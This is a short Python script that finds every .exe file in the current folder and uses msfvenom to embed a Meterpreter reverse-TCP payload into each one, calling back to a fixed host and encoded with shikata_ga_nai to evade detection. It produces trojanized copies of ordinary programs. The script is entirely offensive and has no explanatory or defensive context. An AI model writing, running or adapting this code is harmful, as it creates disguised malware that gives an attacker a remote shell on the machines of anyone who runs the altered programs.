import os


def find_exe_paths():
    exe_paths = []
    for path in os.listdir("."):
        if ".exe" in path:
            exe_paths.append(path)

    return exe_paths


def inject_paths_reverse_tcp(exe_paths):
    for path in exe_paths:
        out_path = path.split(".")[0] + "_injected.exe"
        os.system("msfvenom -a x86 --platform windows -x {} -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -f exe -o {}".format(path, out_path))


if __name__ == "__main__":
    exe_paths = find_exe_paths()
    inject_paths_reverse_tcp(exe_paths)
